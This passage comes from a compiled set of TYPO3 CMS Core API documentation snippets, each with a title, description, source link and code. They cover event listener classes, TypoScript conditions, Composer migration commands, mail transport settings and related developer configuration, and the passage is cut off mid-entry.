https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent/ParseFields.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\SoftReference\\SoftReferenceParserInterface;\n\nfinal readonly class CheckExternalLinksToLocalPagesEventListener\n{\n    private const LOCAL_DOMAIN = 'example.org';\n    private const TABLE_NAME = 'tt_content';\n    private const FIELD_NAME = 'bodytext';\n\n    /**\n     * @param array<mixed> $record\n     * @param array<mixed> $results\n     * @return array<mixed>\n     */\n    private function parseField(array $record, array $results): array\n    {\n        $conf = $GLOBALS['TCA'][self::TABLE_NAME]['columns'][self::FIELD_NAME]['config'];\n        foreach ($this->findAllParsers($conf) as $softReferenceParser) {\n            $parserResult = $softReferenceParser->parse(\n                self::TABLE_NAME,\n                self::FIELD_NAME,\n                $record['uid'],\n                (string)$record[self::FIELD_NAME],\n            );\n            if (!$parserResult->hasMatched()) {\n                continue;\n            }\n            foreach ($parserResult->getMatchedElements() as $matchedElement) {\n                if (!isset($matchedElement['subst'])) {\n                    continue;\n                }\n                $this->matchUrl(\n                    (string)$matchedElement['subst']['tokenValue'],\n                    $record,\n                    $results,\n                );\n            }\n        }\n        return $results;\n    }\n\n    /**\n     * @param array<mixed> $conf\n     * @return SoftReferenceParserInterface[]\n     */\n    private function findAllParsers(array $conf): iterable\n    {\n        return $this->softReferenceParserFactory->getParsersBySoftRefParserList(\n            $conf['softref'],\n            ['subst'],\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extending setUp Method in PHP for TYPO3 Functional Test\nDESCRIPTION: Shows how to override the setUp method in a functional test, calling parent::setUp() and setting up additional test requirements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nprotected function setUp(): void\n{\n    parent::setUp();\n    $this->importCSVDataSet(__DIR__ . '/Fixtures/be_users.csv');\n    $this->setUpBackendUser(1);\n    $GLOBALS['LANG'] = GeneralUtility::makeInstance(LanguageService::class);\n    $this->subject = GeneralUtility::makeInstance(LocalizationRepository::class);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining SendRecoveryEmailEvent Class for TYPO3 CMS Frontend Login\nDESCRIPTION: This snippet defines the SendRecoveryEmailEvent class in the TYPO3\\CMS\\FrontendLogin\\Event namespace. The class represents an event that is triggered when sending a password recovery email. It provides methods to access user information and the email object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/FrontendLogin/SendRecoveryEmailEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\FrontendLogin\\Event;\n\nclass SendRecoveryEmailEvent\n{\n    public function getUserInformation(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getEmail(): \\TYPO3\\CMS\\Core\\Mail\\FluidEmail\n    {\n        // Implementation not shown\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: PHP GitHub Link Validation\nDESCRIPTION: Implementation of canHandleLink() method to validate if a link can be handled by the GitHub link handler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/CustomLinkBrowser.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\npublic function canHandleLink(array $linkParts): bool\n{\n    if (!$linkParts['url'] instanceof LinkService) {\n        return false;\n    }\n    $data = $linkParts['url']->getData();\n    if (!isset($data['type']) || $data['type'] !== 'github') {\n        return false;\n    }\n    $this->linkParts = $linkParts;\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyQueryForLiveSearchEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to create an event listener for the ModifyQueryForLiveSearchEvent. It modifies the query builder to adjust the limit for a specific table and change the result order.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyQueryForLiveSearchEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Search\\Event\\ModifyQueryForLiveSearchEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyQueryForLiveSearchEvent $event): void\n    {\n        $queryBuilder = $event->getQueryBuilder();\n        $tableName = $event->getTableName();\n\n        if ($tableName === 'pages') {\n            $queryBuilder->setMaxResults(50);\n            $queryBuilder->orderBy('crdate', 'DESC');\n        }\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Removing Default MIME Types in .htaccess\nDESCRIPTION: This snippet shows how to remove default MIME type mappings in an `.htaccess` file. This is useful when global server configuration cannot be modified, and it helps prevent unexpected MIME type assignments for files with multiple extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/FileExtensionHandling.rst#2025-04-16_snippet_2\n\nLANGUAGE: apacheconf\nCODE:\n```\nRemoveType .html .htm\nRemoveType .svg .svgz\n```\n\n----------------------------------------\n\nTITLE: Defining ExpressionBuilder right() Method Signature in TYPO3\nDESCRIPTION: Method signature for the right() function in ExpressionBuilder class that extracts a substring from the right side of a value. Takes length, value, and optional AS identifier as parameters. Returns a string expression for database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderRight.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function right(string|int $length, string $value, string $asIdentifier = ''): string\n```\n\n----------------------------------------\n\nTITLE: TYPO3 BeforeRecordDownloadIsExecutedEvent Class Definition\nDESCRIPTION: PHP class definition for handling record downloads in TYPO3 backend. Provides methods to access and modify header rows, records, request information, and download configuration settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforeRecordDownloadIsExecutedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\RecordList\\Event;\n\nclass BeforeRecordDownloadIsExecutedEvent {\n    public function getHeaderRow(): array\n    public function setHeaderRow(array $headerRow)\n    public function getRecords(): array\n    public function setRecords(array $records)\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    public function getTable(): string\n    public function getFormat(): string\n    public function getFilename(): string\n    public function getId(): int\n    public function getModTSconfig(): array\n    public function getColumnsToRender(): array\n    public function isHideTranslations(): bool\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyVersionDifferencesEvent Class in PHP\nDESCRIPTION: This snippet defines the ModifyVersionDifferencesEvent class with methods to get and set version differences, retrieve live record data, and get parameters. It's used in TYPO3 CMS for handling workspace version differences.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Workspaces/ModifyVersionDifferencesEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Workspaces\\Event;\n\nclass ModifyVersionDifferencesEvent\n{\n    public function getVersionDifferences(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setVersionDifferences(array $versionDifferences): void\n    {\n        // Implementation not shown\n    }\n\n    public function getLiveRecordData(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getParameters(): \\stdClass\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: BeforeRedirectEvent Class Definition in TYPO3 Frontend Login\nDESCRIPTION: The BeforeRedirectEvent class is triggered before a redirect occurs during frontend login operations. It allows developers to modify or cancel the redirect URL, and provides access to the login type and request object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/FrontendLogin/BeforeRedirectEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\FrontendLogin\\Event;\n\nclass BeforeRedirectEvent\n{\n    // Notification before a redirect is made, which also allows to modify\n    // the actual redirect URL. Setting the redirect to an empty string\n    // will avoid triggering a redirect.\n    \n    public function getLoginType(): string\n    {\n        // Returns the login type\n    }\n    \n    public function getRedirectUrl(): string\n    {\n        // Returns the current redirect URL\n    }\n    \n    public function setRedirectUrl(string $redirectUrl)\n    {\n        // Sets a new redirect URL\n    }\n    \n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Returns the current request\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterLinkResolvedByStringRepresentationEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the AfterLinkResolvedByStringRepresentationEvent class in the TYPO3\\CMS\\Core\\LinkHandling\\Event namespace. It includes methods for getting and setting the result, getting the URN, and getting the resolve exception.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/LinkHandling/AfterLinkResolvedByStringRepresentationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\LinkHandling\\Event;\n\nclass AfterLinkResolvedByStringRepresentationEvent\n{\n    public function getResult(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setResult(array $result): void\n    {\n        // Implementation not shown\n    }\n\n    public function getUrn(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getResolveException(): ?\\TYPO3\\CMS\\Core\\Exception\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing PostController with Dependency Injection in TYPO3\nDESCRIPTION: Defines a PostController class that extends AbstractController and uses constructor dependency injection to manage blog-related repositories and services. The controller handles blog posts, people, and page title functionality through injected dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/PropertyManager/PropertyMapperInjection.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse T3docs\\BlogExample\\Domain\\Repository\\BlogRepository;\nuse T3docs\\BlogExample\\Domain\\Repository\\PersonRepository;\nuse T3docs\\BlogExample\\Domain\\Repository\\PostRepository;\nuse T3docs\\BlogExample\\PageTitle\\BlogPageTitleProvider;\nuse TYPO3\\CMS\\Extbase\\Property\\PropertyMapper;\n\nclass PostController extends AbstractController\n{\n    /**\n     * PostController constructor.\n     *\n     * Takes care of dependency injection\n     */\n    public function __construct(\n        protected readonly BlogRepository $blogRepository,\n        protected readonly PersonRepository $personRepository,\n        protected readonly PostRepository $postRepository,\n        protected readonly PropertyMapper $propertyMapper,\n        protected readonly BlogPageTitleProvider $blogPageTitleProvider,\n    ) {}\n}\n```\n\n----------------------------------------\n\nTITLE: Suppressing Progress Output When Updating Reference Index\nDESCRIPTION: This command updates the reference index while suppressing the progress output. It's useful when the command is executed by a cronjob or when detailed output is not needed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/PreupgradeTasks/ReferenceIndex.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nreferenceindex:update 2> /dev/null\n```\n\n----------------------------------------\n\nTITLE: Binding Event Listener to a Single Element in TYPO3 JavaScript\nDESCRIPTION: Demonstrates how to bind an event listener directly to a specific DOM element using the bindTo() method. This approach attaches the event handler to exactly one element identified by its ID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/JavaScript/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n// AnyEventStrategy is a placeholder, concrete implementations are handled in the following chapters\nnew AnyEventStrategy('click', callbackFn).bindTo(document.getElementById('foobar'));\n```\n\n----------------------------------------\n\nTITLE: Compatibility Note for TYPO3 TypoScript Setup\nDESCRIPTION: This section warns users about the compatibility of the TypoScript setup and its relevance for installations using site sets. It emphasizes that the setup is only needed for backward compatibility with sites relying solely on TypoScript records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTyposcriptSetupTyposcript.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  attention::\n\n    ..  versionchanged:: 13.1\n\n    This file takes no effect in sites that use :ref:`Site sets <t3coreapi:site-sets>`.\n    This file works for backward compability reasons only in installations that depend\n    on TypoScript records only.\n\n    Provide the TypoScript in your site set. TypoScript that has to be loaded globally\n    can be loaded via :ref:`ExtensionManagementUtility::addTypoScript <t3tsref:extdev-always-load>`.\n```\n\n----------------------------------------\n\nTITLE: Evaluating Site Language Properties\nDESCRIPTION: Demonstrates how to check site language properties like locale in TypoScript conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UseSiteInConditions.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\n[siteLanguage(\"locale\") == \"de_CH.UTF-8\"]\n   page.40.value = bar\n[GLOBAL]\n```\n\n----------------------------------------\n\nTITLE: Adding Plain Content Element or Plugin in PHP\nDESCRIPTION: Demonstrates how to add a plain content element or non-Extbase plugin to the New Content Element wizard using ExtensionManagementUtility::addPlugin().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/ContentElementsWizard.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionManagementUtility::addPlugin(\n    [\n        'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:my_plugin',\n        'my_extension_key',\n        'content-special-menu'\n    ],\n    'CType',\n    'my_extension'\n);\n```\n\n----------------------------------------\n\nTITLE: Variable Naming Migration for Fluid 4.0\nDESCRIPTION: Diff showing migration changes required for EXT:my_extension/Classes/Controller/MyController.php when updating to Fluid 4.0, which reserves the variables 'true', 'false', and 'null'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n..  literalinclude:: _Syntax/_MyController.diff\n    :caption: EXT:my_extension/Classes/Controller/MyController.php (diff)\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFormEnginePageInitializedEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the BeforeFormEnginePageInitializedEvent class in the TYPO3\\CMS\\Backend\\Controller\\Event namespace. The class includes two methods: getController() and getRequest(), which return instances of EditDocumentController and ServerRequestInterface respectively.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforeFormEnginePageInitializedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Backend\\Controller\\Event\n\n..  php:class:: BeforeFormEnginePageInitializedEvent\n\n    Event to listen to before the form engine has been initialized (= before all data will be persisted)\n\n    ..  php:method:: getController()\n        :returns: `\\TYPO3\\CMS\\Backend\\Controller\\EditDocumentController`\n\n    ..  php:method:: getRequest()\n        :returns: `\\Psr\\Http\\Message\\ServerRequestInterface`\n```\n\n----------------------------------------\n\nTITLE: Migrating TYPO3 Directory Structure\nDESCRIPTION: Shell commands for moving TYPO3 configuration files and directories to new locations in Composer-based setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nmv public/typo3conf/sites config/sites\nmv public/typo3temp/var var\nmv public/typo3conf/l10n var/labels\n```\n\n----------------------------------------\n\nTITLE: Custom index.php for setting Application Context\nDESCRIPTION: A custom frontend index.php file that sets the Application Context before loading the actual TYPO3 index.php file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\nputenv('TYPO3_CONTEXT=Development');\nrequire_once('typo3_src/index.php')\n```\n\n----------------------------------------\n\nTITLE: Installing typo3-core-patches Package\nDESCRIPTION: Command to install the gilbertsoft/typo3-core-patches Composer package, which provides an automated way to apply TYPO3 core patches directly from the review system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncomposer req gilbertsoft/typo3-core-patches\n```\n\n----------------------------------------\n\nTITLE: Displaying Configuration Directory Structure of EXT:tea Extension\nDESCRIPTION: Shows the subdirectory structure within the Configuration folder, including FlexForms, TCA, TsConfig, TypoScript, and Services.yaml, which handle various configuration aspects of the extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/DirectoryStructure.rst#2025-04-16_snippet_2\n\nLANGUAGE: none\nCODE:\n```\n$ tree path/to/extension/tea\n├── Configuration\n    ├── FlexForms\n    ├── TCA\n    |   └── Overrides\n    ├── TsConfig\n    |   ├── Page\n    |   └── User\n    ├── TypoScript\n    |   ├── constants.typoscript\n    |   └── setup.typoscript\n    └──  Services.yaml\n```\n\n----------------------------------------\n\nTITLE: TCA Configuration for Content Field with Soft References\nDESCRIPTION: PHP configuration for tt_content.bodytext field showing soft reference parser setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SoftReferences/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n'bodytext' => [\n    'config' => [\n        'softref' => 'typolink_tag,email[subst],url'\n    ]\n]\n```\n\n----------------------------------------\n\nTITLE: Assigning Variables in PHP for Fluid Templates\nDESCRIPTION: Demonstrates how to assign a variable in a PHP controller for use in a Fluid template. The assign method takes a variable name and value that can later be output in the template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$this->view->assign('title', 'An example title');\n```\n\n----------------------------------------\n\nTITLE: Defining LoginConfirmedEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the LoginConfirmedEvent class in the TYPO3\\CMS\\FrontendLogin\\Event namespace. It includes properties for request, user, and loginType, along with their respective getter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/LoginConfirmedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class LoginConfirmedEvent\n{\n    public function __construct(\n        private readonly ServerRequestInterface $request,\n        private readonly array $user,\n        private readonly string $loginType\n    ) {\n    }\n\n    public function getRequest(): ServerRequestInterface\n    {\n        return $this->request;\n    }\n\n    public function getUser(): array\n    {\n        return $this->user;\n    }\n\n    public function getLoginType(): string\n    {\n        return $this->loginType;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Data Structure XML with Referenced Sheets in TYPO3\nDESCRIPTION: An example of a Data Structure XML document that uses referenced sheets to external XML files. This structure requires additional processing to resolve the sheet content from the referenced files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/T3datastructure/Parsing/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<T3DataStructure>\n  <sheets>\n        <sDEF>fileadmin/sheets/default_sheet.xml</sDEF>\n    <s_welcome>fileadmin/sheets/welcome_sheet.xml</s_welcome>\n  </sheets>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: Frontend User Database Table Reference - SQL\nDESCRIPTION: References the database table where frontend users are stored in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/FrontendUsers/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nfe_users\n```\n\n----------------------------------------\n\nTITLE: TYPO3 TypoScript Context Condition Check\nDESCRIPTION: Shows how to check the application context using TypoScript conditions with the 'if' statement to evaluate the current context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: typoscript\nCODE:\n```\nif {\n   value.data = applicationcontext\n   equals = Development/Dev1\n}\n```\n\n----------------------------------------\n\nTITLE: RST Document Structure for TYPO3 Country Events\nDESCRIPTION: RST formatted documentation structure that includes page headers, index entries, and table of contents for TYPO3 country-related events documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Country/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Country\n..  _eventlist-core-country:\n\n=======\nCountry\n=======\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Country.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Configuring Email Transport - TYPO3 PHP\nDESCRIPTION: This snippet specifies the transport method for sending emails, allowing configurations for sendmail, SMTP, and more. It sets the default transport as 'sendmail'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport'] = 'sendmail';\n```\n\n----------------------------------------\n\nTITLE: Showing Site Configuration using TYPO3 CLI - Legacy Installation\nDESCRIPTION: Command to display complete YAML configuration for a specific TYPO3 site using its identifier in Legacy installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/CliTools.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 site:show <identifier>\n```\n\n----------------------------------------\n\nTITLE: Using Workspace Aspect in TYPO3 Controller PHP\nDESCRIPTION: This example demonstrates the usage of the Workspace aspect in a TYPO3 controller. It shows how to retrieve and use various workspace properties within a controller method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Core\\Context\\Context;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass MyController extends ActionController\n{\n    protected Context $context;\n\n    public function __construct(Context $context)\n    {\n        $this->context = $context;\n    }\n\n    public function myAction(): ResponseInterface\n    {\n        $workspaceId = $this->context->getPropertyFromAspect('workspace', 'id');\n        $isLive = $this->context->getPropertyFromAspect('workspace', 'isLive');\n        $isOffline = $this->context->getPropertyFromAspect('workspace', 'isOffline');\n\n        // Do something with the workspace information\n        // ...\n\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Figure Directive for TYPO3 Storage Path Screenshot\nDESCRIPTION: ReStructuredText directive to include and format a screenshot showing the local storage path configuration options in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/LocalStoragePath.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AccessControl/LocalStoragePath.png\n   :class: with-shadow\n\n   The paths options for a storage based on the local file system driver\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeLoadedPageTsConfigEvent Listener in TYPO3\nDESCRIPTION: An example event listener that implements the BeforeLoadedPageTsConfigEvent. This event allows adding global static page TSconfig before other configurations are loaded. The listener generates static configuration that doesn't depend on runtime or request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/TypoScript/BeforeLoadedPageTsConfigEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\TypoScript\\EventListener;\n\nuse TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event\\BeforeLoadedPageTsConfigEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeLoadedPageTsConfigEvent $event): void\n    {\n        $event->addTsConfig(\n            \"\"\"\n            TCEFORM.pages.subtitle.disabled = 1\n            \"\"\"\n        );\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Resulting Flattened Array Structure in TYPO3 CMS\nDESCRIPTION: Shows the resulting PHP array structure after flattening the TypoScript settings using getFlatSettings().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/FrontendTypoScript.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$flatSettings = [\n    'mySettings.foo' => 'fooValue',\n    'mySettings.bar' => 'barValue',\n];\n```\n\n----------------------------------------\n\nTITLE: Referencing FAL Database Tables in SQL\nDESCRIPTION: Lists the primary database tables used by TYPO3's File Abstraction Layer (FAL). These include sys_file for basic file information, sys_file_metadata for extended properties, and sys_file_reference for tracking file usage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Concepts/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nsys_file\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_file_metadata\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_file_reference\n```\n\n----------------------------------------\n\nTITLE: Defining IsContentUsedOnPageLayoutEvent Class Methods in TYPO3\nDESCRIPTION: PHP class documentation for IsContentUsedOnPageLayoutEvent which provides methods to check if content elements are being used in the TYPO3 backend page layout. Includes methods for getting record data, checking usage status, setting usage flag, retrieving column positions, and accessing page layout context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/IsContentUsedOnPageLayoutEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\View\\Event;\n\nclass IsContentUsedOnPageLayoutEvent {\n    public function getRecord(): array;\n    public function isRecordUsed(): bool;\n    public function setUsed(bool $isUsed);\n    public function getKnownColumnPositionNumbers(): array;\n    public function getPageLayoutContext(): \\TYPO3\\CMS\\Backend\\View\\PageLayoutContext;\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Page Tree Element for TYPO3 Backend Navigation\nDESCRIPTION: This code specifies the exact component to be used for the page tree in the TYPO3 backend. It's a string value typically set in backend module configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/PageTree.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n'@typo3/backend/tree/page-tree-element'\n```\n\n----------------------------------------\n\nTITLE: Driver Interface Method for Copying Files Within Storage\nDESCRIPTION: Declaration of the copyFileWithinStorage method from the DriverInterface, which handles copying files within the same storage. The method accepts file and target folder identifiers along with a filename and returns the identifier of the new file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Components.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Copies a file *within* the current storage.\n * Note that this is only about an inner storage copy action,\n * where a file is just copied to another folder in the same storage.\n *\n * @param non-empty-string $fileIdentifier\n * @param non-empty-string $targetFolderIdentifier\n * @param non-empty-string $fileName\n * @return non-empty-string the Identifier of the new file\n */\npublic function copyFileWithinStorage(string $fileIdentifier, string $targetFolderIdentifier, string $fileName): string;\n```\n\n----------------------------------------\n\nTITLE: Running the Message Consumer Command in TYPO3\nDESCRIPTION: Bash commands to run the message consumer for asynchronous message processing. Different commands are shown for composer-based and legacy installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: Bash\nCODE:\n```\nvendor/bin/typo3 messenger:consume <receiver-name>\n```\n\nLANGUAGE: 